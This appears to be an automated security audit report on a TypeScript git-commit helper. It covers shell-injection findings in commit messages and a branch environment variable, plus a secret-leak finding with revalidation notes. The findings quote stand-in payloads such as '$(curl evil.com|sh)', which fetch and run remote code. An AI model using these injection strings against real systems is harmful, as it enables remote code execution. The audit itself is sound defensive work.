candidates.snippet:
const DATA_DIR = path.resolve("data");
const DATA_BRANCH = process.env.DEEPSEC_DATA_BRANCH ?? "main";

findings.title: Shell command injection via JSON.stringify in git commit message
findings.description: Line 31 builds a shell command string with `git commit -m ${JSON.stringify(message)}` and passes it to execSync, which spawns a shell. JSON.stringify only escapes `"`, `\`, and control characters — it does NOT escape `$`, backticks, or `!` (history expansion), all of which retain special meaning inside double-quoted shell strings. The message comes from callers like `enrich.ts`: `commitAndPushData(`enrich: ${projectId} (${result.enriched} files)`)`. `projectId` flows from `--project-id` CLI args, `deepsec.config.ts`, or the directory basename auto-derived during `init`. A `projectId` value such as `$(curl evil.com|sh)` or `` `whoami` `` would be wrapped by JSON.stringify into `"...$(curl evil.com|sh)..."` and the substitution would execute when the shell parses the command. The threat model classifies CLI args/config as trusted, so the realistic exploit is self-RCE rather than cross-user attack — but this is exactly the unsafe shell-interpolation pattern called out in CLAUDE.md, and it would become a real RCE the moment any caller hands in a sandbox-derived or otherwise less-trusted value.
findings.recommendation: Use the array form of execFileSync to bypass the shell entirely: `execFileSync('git', ['commit', '-m', message], { cwd: DATA_DIR, ... })`. Apply the same fix to all execSync calls in this file.

revalidation.reasoning: The current file no longer imports or uses execSync for the git commit path. commitAndPushData now calls execFileSync("git", ["commit", "-m", message], ...), so the commit message is passed as an argv element and is not parsed by a shell. The caller in packages/deepsec/src/commands/enrich.ts still builds the message from projectId, but that value now remains data, not shell syntax. A payload such as $(...) or backticks inside projectId would be included literally in the commit message. I could not inspect git history because /vercel/sandbox/target is not a git repository in this environment, but the current vulnerable string-shell construction described in the finding is absent. Under the stated trust model, projectId from CLI/config is also developer-controlled, but the current code has removed the unsafe shell interpolation regardless.

findings.title: Shell command injection via DEEPSEC_DATA_BRANCH environment variable
findings.description: Lines 41 and 47 interpolate the `DATA_BRANCH` constant — read from `process.env.DEEPSEC_DATA_BRANCH` at module load (line 5) — directly into shell command strings: `git pull --rebase origin ${DATA_BRANCH}` and `git push origin HEAD:${DATA_BRANCH}`. There is no validation that the value is a legitimate ref name. A value like `main; curl evil.com | sh` or `$(...)` causes arbitrary command execution. The env var is loaded via dotenv from `.env.local` at CLI startup (cli.ts L1-4); if a user pulls a repo that ships its own .env.local (or follows untrusted setup instructions to set it), this becomes the exploit vector. Like the JSON.stringify case, this is the brittle shell-interpolation pattern explicitly called out in the project threat model.
findings.recommendation: Validate DATA_BRANCH against `^[A-Za-z0-9._/-]+$` (or stricter) at module load and throw on mismatch, AND switch to execFileSync with arg arrays so the value is never re-parsed by a shell: `execFileSync('git', ['pull', '--rebase', 'origin', DATA_BRANCH], ...)`.

revalidation.reasoning: The current code reads DEEPSEC_DATA_BRANCH into RAW_BRANCH and validates it against /^[A-Za-z0-9._/-]+$/ before assigning DATA_BRANCH. The git pull and push operations are performed with execFileSync argv arrays: ["pull", "--rebase", "origin", DATA_BRANCH] and ["push", "origin", `HEAD:${DATA_BRANCH}`]. Because no shell is involved, metacharacters such as semicolons, command substitutions, pipes, and spaces are not interpreted as commands. The regex also rejects the examples in the finding, including main; curl ... and $(...). The only remaining interpolation of DATA_BRANCH is in a console.error message that tells the user how to push manually, which is not command execution. I could not cite a historical commit because the workspace has no .git directory, but the current vulnerable shell-string calls are gone.

findings.title: Raw scanner snippets can be committed and pushed to the data repository
findings.description: commitAndPushData stages all changes under the deepsec data root with `git add -A` and pushes them to `origin`. File records written by the scanner include raw `CandidateMatch.snippet` values copied from scanned source, and the secret matchers intentionally match hardcoded credentials such as `password = "..."` or API keys. When `enrichCommand` calls commitAndPushData, any existing `data/<projectId>/files/*.json` records containing secret-bearing snippets can be committed and pushed to a remote data branch. This can leak secrets from the scanned repository into a separate committed data store, especially if that repository or branch is shared more broadly than the source repo. The git command execution itself is not shell-injectable because argv form is used and the branch is regex-validated; the issue is the unredacted sensitive content being committed.
findings.recommendation: Redact or omit raw snippets for secret-related candidates before writing file records, or exclude candidate snippets from committed data. Add a secret-scrubbing pass before `git add -A` and fail closed if known secret patterns remain in `data/<projectId>/files/*.json`.

revalidation.reasoning:
ACCEPTED RISK (manual decision; documented in .deepsec/README.md `## Accepted risks`). data-commit.ts ships a `scrubCommittedDataDir()` pass that drops snippets for credential-finding matchers (SECRET_SLUGS) and fail-closes on any leftover credential-shaped string via CREDENTIAL_RE. The revalidator correctly notes that this is not airtight — a slug we don't enumerate (e.g., a future secret-bearing matcher) plus a credential format the regex doesn't match would still leak. We accept the residual risk because (1) `commitAndPushData` only ever runs against the deepsec data repo with explicit user/CI invocation, (2) the matcher-side fix would require restructuring CandidateMatch to carry a redact-by-default flag set at scanner time, and (3) the fail-closed CREDENTIAL_RE backstop catches the most common formats. Any new secret-finding matcher MUST be added to SECRET_SLUGS in data-commit.ts as part of its review.

--- Original revalidation ---
The current code added scrubCommittedDataDir before git add -A, which substantially reduces the original leakage path, but it does not fully close it. Scanner records still contain CandidateMatch.snippet as required by packages/core/src/schemas.ts, and writeFileRecord persists the full record to data/<projectId>/files/*.json. The scrubber only redacts snippets for a fixed SECRET_SLUGS set and then applies CREDENTIAL_RE as a fallback. That set omits secret-oriented matchers such as tf-secret-in-data and secrets-plaintext-exposure, and the fallback regex does not cover all credential names, for example a Terraform kubernetes_secret data entry like token = "long-plaintext-token-value". In that concrete path, tf-secret-in-data writes the raw snippet, commitAndPushData walks the file, does not redact by slug, may not match CREDENTIAL_RE, then stages all data with git add -A and pushes it. The attacker model here is not remote code execution, but the project context explicitly calls token leakage into committed state a real concern. Therefore the finding remains real, although partially mitigated for several common slugs and credential formats.
